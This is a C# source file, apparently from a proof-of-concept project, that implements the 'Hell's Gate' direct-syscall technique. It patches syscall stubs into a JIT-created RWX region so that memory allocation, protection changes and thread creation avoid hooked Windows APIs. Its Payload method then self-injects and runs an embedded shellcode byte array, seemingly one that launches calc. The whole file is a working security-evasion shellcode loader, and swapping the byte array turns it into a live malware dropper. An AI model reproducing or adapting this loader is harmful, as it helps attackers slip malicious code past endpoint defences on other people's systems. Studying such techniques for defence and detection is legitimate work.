using System;
using SharpHellsGate.Win32;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace SharpHellsGate {

    /// <summary>
    /// Main implementation of the Hell's Gate technique.
    /// Responsible for generating a RWX memory region, inject and execute system call stubs.
    /// </summary>
    public class HellsGate {

        /// <summary>
        /// Used to check if the RWX memory region was generated.
        /// </summary>
        private bool IsGateReady { get; set; } = false;

        /// <summary>
        /// Used as for mutual exclusion while injecting and execution of the system call stub in memory.
        /// </summary>
        private object Mutant { get; set; } = new object();

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<UInt64, Util.APITableEntry> APITable { get; set; } = new Dictionary<ulong, Util.APITableEntry>() { };

        /// <summary>
        /// Address of the managed method that was JIT'ed.
        /// </summary>
        private IntPtr MangedMethodAddress { get; set; } = IntPtr.Zero;

        /// <summary>
        /// Address of the RWX memory region after JIT compiling the managed method.
        /// </summary>
        private IntPtr UnmanagedMethodAddress { get; set; } = IntPtr.Zero;

        /// <summary>
        /// This function will be JIT at runtime to create RWX memory region.
        /// </summary>
        //// <returns>Gate returns either STATUS_SUCCESS or an error status code.</returns>
        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        private static UInt32 Gate() {
            return new UInt32();
        }

        /// <summary>
        /// Inject in memory a basic system call stub and return a delegate for execution via un-managed code.
        /// </summary>
        /// <typeparam name="T">The desired delegate Type.</typeparam>
        /// <param name="syscall">The system call to execute.</param>
        /// <returns>A delegate of to execute the system call.</returns>
        private T NtInvocation<T>(Int16 syscall) where T: Delegate {
            if (!this.IsGateReady || this.UnmanagedMethodAddress == IntPtr.Zero) {
                Util.LogError("Unable to inject system call stub");
                return default;
            }

            Span<byte> stub = stackalloc byte[24] {
                0x4c, 0x8b, 0xd1,                                      // mov  r10, rcx
                0xb8, (byte)syscall, (byte)(syscall >> 8), 0x00, 0x00, // mov  eax, <syscall
                0xf6, 0x04, 0x25, 0x08, 0x03, 0xfe, 0x7f, 0x01,        // test byte ptr [SharedUserData+0x308],1
                0x75, 0x03,                                            // jne  ntdll!<function>+0x15
                0x0f, 0x05,                                            // syscall
                0xc3,                                                  // ret
                0xcd, 0x2e,                                            // int  2Eh
                0xc3                                                   // ret
            };

            Marshal.Copy(stub.ToArray(), 0, this.UnmanagedMethodAddress, stub.Length);
            return Marshal.GetDelegateForFunctionPointer<T>(this.UnmanagedMethodAddress);
        }

        /// <summary>
        /// Managed wrapper around the NtAllocateVirtualMemory native Windows function
        /// </summary>
        /// <param name="ProcessHandle">A handle for the process for which the mapping should be done.</param>
        /// <param name="BaseAddress">A pointer to a variable that will receive the base address of the allocated region of pages.</param>
        /// <param name="ZeroBits">The number of high-order address bits that must be zero in the base address of the section view.</param>
        /// <param name="RegionSize">A pointer to a variable that will receive the actual size, in bytes, of the allocated region of pages.</param>
        /// <param name="AllocationType">A bitmask containing flags that specify the type of allocation to be performed for the specified region of pages.</param>
        /// <param name="Protect">A bitmask containing page protection flags that specify the protection desired for the committed region of pages.</param>
        /// <returns>NtAllocateVirtualMemory returns either STATUS_SUCCESS or an error status code.</returns>
        private UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtAllocateVirtualMemoryHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtAllocateVirtualMemory Func = NtInvocation<DFunctions.NtAllocateVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }

        /// <summary>
        /// Managed wrapper around the NtProtectVirtualMemory native Windows function.
        /// </summary>
        /// <param name="ProcessHandle">Handle to Process Object opened with PROCESS_VM_OPERATION access.</param>
        /// <param name="BaseAddress">Pointer to base address to protect. Protection will change on all page containing specified address. On output, BaseAddress will point to page start address.</param>
        /// <param name="NumberOfBytesToProtect">Pointer to size of region to protect. On output will be round to page size (4KB).</param>
        /// <param name="NewAccessProtection">One or some of PAGE_... attributes.</param>
        /// <param name="OldAccessProtection">Receive previous protection.</param>
        /// <returns>NtProtectVirtualMemory returns either STATUS_SUCCESS or an error status code.</returns>
        private UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtProtectVirtualMemoryHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtProtectVirtualMemory Func = NtInvocation<DFunctions.NtProtectVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, out OldAccessProtection);
            }
        }

        /// <summary>
        /// Managed wrapper around the NtCreateThreadEx native Windows function.
        /// </summary>
        /// <param name="hThread">Caller supplied storage for the resulting handle.</param>
        /// <param name="DesiredAccess">Specifies the allowed or desired access to the thread.</param>
        /// <param name="ObjectAttributes">Initialized attributes for the object.</param>
        /// <param name="ProcessHandle">Handle to the threads parent process.</param>
        /// <param name="lpStartAddress">Address of the function to execute.</param>
        /// <param name="lpParameter">Parameters to pass to the function.</param>
        /// <param name="CreateSuspended">Whether the thread will be in suspended mode and has to be resumed later.</param>
        /// <param name="StackZeroBits"></param>
        /// <param name="SizeOfStackCommit">Initial stack memory to commit.</param>
        /// <param name="SizeOfStackReserve">Initial stack memory to reserve.</param>
        /// <param name="lpBytesBuffer"></param>
        /// <returns>NtCreateThreadEx returns either STATUS_SUCCESS or an error status code.</returns>
        private UInt32 NtCreateThreadEx(ref IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtCreateThreadExHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtCreateThreadEx Func = NtInvocation<DFunctions.NtCreateThreadEx>(syscall);
                return Func(ref hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            }
        }

        /// <summary>
        /// Managed wrapper around the NtWaitForSingleObject native Windows function.
        /// </summary>
        /// <param name="ObjectHandle">Open handle to a alertable executive object.</param>
        /// <param name="Alertable">If set, calling thread is signaled, so all queued APC routines are executed.</param>
        /// <param name="TimeOuts">Time-out interval, in microseconds. NULL means infinite.</param>
        /// <returns>NtWaitForSingleObject returns either STATUS_SUCCESS or an error status code.</returns>
        private UInt32 NtWaitForSingleObject(IntPtr ObjectHandle, bool Alertable, ref Structures.LARGE_INTEGER TimeOuts) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtWaitForSingleObjectHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtWaitForSingleObject Func = NtInvocation<DFunctions.NtWaitForSingleObject>(syscall);
                return Func(ObjectHandle, Alertable, ref TimeOuts);
            }
        }

        /// <summary>
        /// .ctor
        /// </summary>
        /// <param name="Table">The API table that will be used by the multiple function wrapers.</param>
        public HellsGate(Dictionary<UInt64, Util.APITableEntry> Table) {
            this.APITable = Table;
        }

        /// <summary>
        /// JIT a static method to generate RWX memory segment.
        /// </summary>
        /// <returns>Whether the memory segment was successfully generated.</returns>
        public bool GenerateRWXMemorySegment() {
            // Find and JIT the method
            MethodInfo method = typeof(HellsGate).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.NonPublic);
            if (method == null) {
                Util.LogError("Unable to find the method");
                return false;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            // Get the address of the function and check if first opcode == JMP
            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();
            if (Marshal.ReadByte(pMethod) != 0xe9) {
                Util.LogError("Method was not JIT'ed or invalid stub");
                return false;
            }
            Util.LogInfo($"Managed method address:   0x{pMethod:x16}");

            // Get address of jited method and stack alignment 
            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr = (UInt64)pMethod + (UInt64)offset;
            while (addr % 16 != 0)
                addr++;
            Util.LogInfo($"Unmanaged method address: 0x{addr:x16}\n");

            this.MangedMethodAddress = method.MethodHandle.GetFunctionPointer();
            this.UnmanagedMethodAddress = (IntPtr)addr;
            this.IsGateReady = true;
            return true;
        }

        /// <summary>
        /// Payload example. In this case this is a basic shellcode self-injection.
        /// </summary>
        public void Payload() {
            if (!this.IsGateReady) {
                if (!this.GenerateRWXMemorySegment()) {
                    Util.LogError("Unable to generate RX memory segment");
                    return;
                }
            }

            byte[] shellcode = new byte[273] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00,0xc3
            };
            Util.LogInfo($"Shellcode size: {shellcode.Length} bytes");

            // Allocate Memory
            IntPtr pBaseAddres = IntPtr.Zero;
            IntPtr Region = (IntPtr)shellcode.Length;
            UInt32 ntstatus = NtAllocateVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, IntPtr.Zero, ref Region, Macros.MEM_COMMIT | Macros.MEM_RESERVE, Macros.PAGE_READWRITE);
            if (!Macros.NT_SUCCESS(ntstatus)) {
                Util.LogError($"Error ntdll!NtAllocateVirtualMemory (0x{ntstatus:0x8})");
                return;
            }
            Util.LogInfo($"Page address:   0x{pBaseAddres:x16}");

            // Copy Memory
            Marshal.Copy(shellcode, 0, pBaseAddres, shellcode.Length);
            Array.Clear(shellcode, 0, shellcode.Length);

            // Change memory protection
            UInt32 OldAccessProtection = 0;
            ntstatus = NtProtectVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, ref Region, Macros.PAGE_EXECUTE_READ, ref OldAccessProtection);
            if (!Macros.NT_SUCCESS(ntstatus) || OldAccessProtection != 0x0004) {
                Util.LogError($"Error ntdll!NtProtectVirtualMemory (0x{ntstatus:0x8})");
                return;
            }

            IntPtr hThread = IntPtr.Zero;
            ntstatus = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, Macros.GetCurrentProcess(), pBaseAddres, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (!Macros.NT_SUCCESS(ntstatus) || hThread == IntPtr.Zero) {
                Util.LogError($"Error ntdll!NtCreateThreadEx (0x{ntstatus:0x8})");
                return;
            }
            Util.LogInfo($"Thread handle:  0x{hThread:x16}\n");

            // Wait for one second
            Structures.LARGE_INTEGER TimeOut = new Structures.LARGE_INTEGER();
            TimeOut.QuadPart = -10000000;
            ntstatus = NtWaitForSingleObject(hThread, false, ref TimeOut);
            if (ntstatus != 0x00) {
                Util.LogError($"Error ntdll!NtWaitForSingleObject (0x{ntstatus:0x8})");
                return;
            }
        }
    }
}
